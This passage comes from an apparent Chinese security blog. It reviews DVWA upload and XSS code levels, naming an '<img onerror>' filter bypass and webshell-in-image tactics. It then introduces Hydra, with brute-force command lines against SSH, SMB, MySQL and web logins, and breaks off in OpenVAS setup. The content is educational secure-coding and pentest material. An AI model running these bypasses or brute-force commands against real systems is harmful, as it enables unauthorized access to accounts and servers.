class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>我们首先看到这个代码中使用的验证手段<code>( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         getimagesize( $uploaded_tmp )</code>,<br>        首先判断文件名结尾是不是’jpg’,’jepg’,’png’类型，然后调用getimagesize()函数获取图像大小，其实就是判断图像格式是否规范。函数细节可以参看官网表述:（<a href="http://php.net/manual/zh/function.getimagesize.php）" target="_blank" rel="noopener">http://php.net/manual/zh/function.getimagesize.php）</a><br>        然后文件大小也进行了判断。所以这里主要存在两个限制条件，首先必须以特定文件名结尾，然后文件格式还得满足特定的图片格式。但是这样的代码虽然加大攻击难度，在一些条件成立的条件下，仍旧可以进行攻击，上传shell,首先图片格式可以伪造，在元数据中包含webshell，然后找到一个文件包含漏洞，就可以成功实现攻击，上c传shell。</p><ul><li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>; </span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; </span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder? </span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files </span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>这个代码规范里，除了有之前所说的一些限制外，还加上了随机id与文件名结合MD5编码作为文件名，这会让webshell连接的时候找不到具体的文件而吃闭门羹。而且使用了imagecreatefromjpeg（）函数来对上次的图进行了重构，去除了多余的元数据，使得webshell无法隐匿在图片里面。这样一来双重保险下，彻底断绝了upload漏洞的可能。当然这里仍旧加入了Anti-CSRFtoken来防止CSRF攻击。</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>反射型xss是一种attack通过操作url，web应用将attack输入的url参数不加过滤或者过滤不全的情况下直接回显到客户端，造成前端脚本注入执行（多是JS执行），读者可以通过以下的实例看到漏洞的产生细节。当然在反射型xss中有一种别具一格的漏洞利用方式，那就是DOM型xss,这种类型的xss不会直接出现拼接到源码中，而是js在运行时操作dom对象来实现输出。DVWA只对xss笼统的归纳，归纳为反射型和存储型。那么我们就先对这两种编码规范进行理解（把dom 型xss放一放)。由于本身的代码量不大，所以直接给出所有反射型代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Low</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//High</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过以上的代码范例可以看到，在medium和high的防御措施上，仍旧是黑名单式的过滤，而且思考的很狭隘，只是过滤了<code>&lt;script&gt;</code>标签，medium中直接硬编码的黑名单最不可取，别说换标签，直接大小写绕过；在High级别里面，通过正则，避免了<code>&lt;script&gt;</code>标签使用的可能，但是能够触发js的标签远不止这一个，随便一个如<code>&lt;img src=1 onerror=[xss]&gt;</code>都是可以绕过的。可以想到基于黑名单的策略是很容易疏漏的，不可取。在impossible中，直接对输入进行htnlspecilchars()编码转换，杜绝了xss。</p><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>注意下面的代码只是偏向于服务器对用户的输入不经过验证处理就直接入库，导致下次取出展现到前端的时候出现xss。代码没有包含从数据库取出的操作部分。因为只要从用户获取到数据后进行了严格的验证处理，就可以避免存储型xss，所以最终原因不是从数据库取出部分，所以DVWA省略掉了。出于篇幅原因，在DVWA的存储型的漏洞复现中的缺陷细节和反射型类似，都是标签，正则过滤不全。就不再赘述，现把impossible代码规范列出：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = stripslashes( $message ); </span><br><span class="line">    $message = mysql_real_escape_string( $message ); </span><br><span class="line">    $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = stripslashes( $name ); </span><br><span class="line">    $name = mysql_real_escape_string( $name ); </span><br><span class="line">    $name = htmlspecialchars( $name ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到代码中对txtName和mtxMessage用htmlspecialchars()转义成了html实体，但是仅有这个是不够的，我们从前面的函数解释可以了解到，这个函数在不加<code>ENT_QUOTES</code>参数是默认不转义<code>&#39;</code>，而且该函数不考虑<code>\</code>（容易造成sql注入，语句单引号被转义问题，当然数据库交互不是PDO模式才有可能存在sql注入），这样仍旧会造成xss，好在代码之前还使用了stripslashes()和mysql_real_escape_string()来分别对<code>&#39;</code>和<code>\</code>进行过，从而杜绝了xss。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.sitepoint.com/top-10-php-security-vulnerabilities/" target="_blank" rel="noopener">https://www.sitepoint.com/top-10-php-security-vulnerabilities/</a><br><a href="http://blog.jobbole.com/53821/" target="_blank" rel="noopener">http://blog.jobbole.com/53821/</a><br><a href="https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet</a><br><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a><br><a href="https://github.com/Go0s/LFIboomCTF" target="_blank" rel="noopener">https://github.com/Go0s/LFIboomCTF</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 安全编码规范 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建</title>
      <link href="/2018/08/14/mysql%E5%BC%B1%E5%AF%86%E7%A0%81/"/>
      <url>/2018/08/14/mysql%E5%BC%B1%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/mysql弱密码登陆/mysql.png" height="350" width="350"></p><blockquote><p>hydra是一个基于字典的密码暴力破解工具，在kali里面集成，在其他发行版里也大都可以通过包管理器进行安装。它默认集成了很多常用的服务以及协议暴力枚举攻击载荷，在渗透测试中有举足轻重的作用。同样的，openvas是一个漏洞扫描器，真的是相当的强大，里面搜录了40多万个漏洞，包括CVE,NVD漏洞平台等，是Nessus项目分支并且开源，在mysql弱密码的漏洞的学习和自动化工具使用的过程中，被这两个工具深深安利到了，所以写下这篇文章，主要介绍工具的使用和安装过程。<br><a id="more"></a></p><h1 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h1><p>hydra 这个工具的安装还是比较的友好，可以直接使用的包管理器。在日常的使用中，要注意收集一些比较好用的字典，或者根据渗透测试的信息搜集，生成一些比较有针对性的字典。</p></blockquote><p>hydra的强大体现在它支持的服务类型相当的多，集成化很高，并且使用接口很简单，目前支持的服务类型有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Asterisk,AFP,CiscoAAA,Ciscoauth,Ciscoenable,CVS,Firebird,FTP,HTTP-FORM-GET,HTTP-FORM-POST,</span><br><span class="line"></span><br><span class="line">HTTP-GET,HTTP-HEAD,HTTP-POST,HTTP-PROXY,HTTPS-FORM-GET,HTTPS-FORM-POST,HTTPS-GET,HTTPS-POST,HTTPS-HEAD,</span><br><span class="line"></span><br><span class="line">HTTP-Proxy,ICQ,IMAP,IRC,LDAP,MS-SQL,MYSQL,NCP,NNTP,OracleListener,OracleSID,Oracle,</span><br><span class="line"></span><br><span class="line">PC-Anywhere,PCNFS,POP3,POSTGRES,RDP,Rexec,Rlogin,Rsh,RTSP,S7-300,SAP/R3,SIP,SMB,SMTP,</span><br><span class="line"></span><br><span class="line">SMTPEnum,SNMP,SOCKS5,SSH(v1andv2),Subversion,Teamspeak(TS2),Telnet,VMware-Auth,VNCandXMPP.</span><br></pre></td></tr></table></figure></p><h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]</span><br><span class="line">[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</span><br><span class="line"></span><br><span class="line">-R 继续从上一次进度接着破解。</span><br><span class="line">-S 采用SSL链接。</span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。</span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE 指定用户名字典。</span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="line">-P FILE 大写，指定密码字典。</span><br><span class="line">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class="line">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span><br><span class="line">-M FILE 指定目标列表文件一行一条。</span><br><span class="line">-o FILE 指定结果输出文件。</span><br><span class="line">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t TASKS 同时运行的线程数，默认为16。</span><br><span class="line">-w TIME 设置最大超时的时间，单位秒，默认是30s。</span><br><span class="line">-v / -V 显示详细过程。</span><br><span class="line">server 目标ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># hydra的使用十分简单，用得比较多的是-P，-p,-l,-L选项，常见的暴力破解命令举例：</span><br><span class="line"></span><br><span class="line">#破解ssh：</span><br><span class="line">hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.8 ssh</span><br><span class="line"></span><br><span class="line">#破解smb</span><br><span class="line"> hydra -l administrator -P pass.txt 10.36.16.18 smb</span><br><span class="line"> </span><br><span class="line">#破解mysql</span><br><span class="line">hydra  -l root –p pass.txt –e ns 127.0.0.1 mysql</span><br><span class="line"></span><br><span class="line">#破解post web登陆</span><br><span class="line">hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 关于hydra的代理使用,现在已经支持socks5,socks4,http,同时可以支持代理列表的方式，现在已经可以支持64个实体代理列表</span><br><span class="line">export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)</span><br><span class="line">export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)</span><br><span class="line">export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080</span><br><span class="line">export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)</span><br></pre></td></tr></table></figure><h1 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h1><p>OpenVAS是开放式漏洞评估系统，Nessus项目分支，可以用来管理目标系统的漏洞，并且免费开源，在kali默认安装，但未配置和启动。它里面集成了现在比较大型的漏洞发布平台的数据库，并且可以实现自动化poc利用和漏洞探测，包括CVE，NVD等。</p><p>这个工具的安装还是相当的繁琐的，涉及证书的导入，redis,sqlite3数据库的安装,还有漏洞数据库的更新，整个流程做下来还是相当的费时间的。在虚拟机的fedora里面体验了一把原生态的安装流程，真的是要吐血了，好在现在有docker这个神器，一切都是那么的优雅。所以现在记录一下fedora,kali,docker的安装流程。其实docker里的安装其实是基于ubuntu 16.04的镜像进行构建的，查看Dockerfile可以学习到ubuntu 16.04下的安装办法。</p><h3 id="Kali-2-0"><a href="#Kali-2-0" class="headerlink" title="Kali 2.0"></a>Kali 2.0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 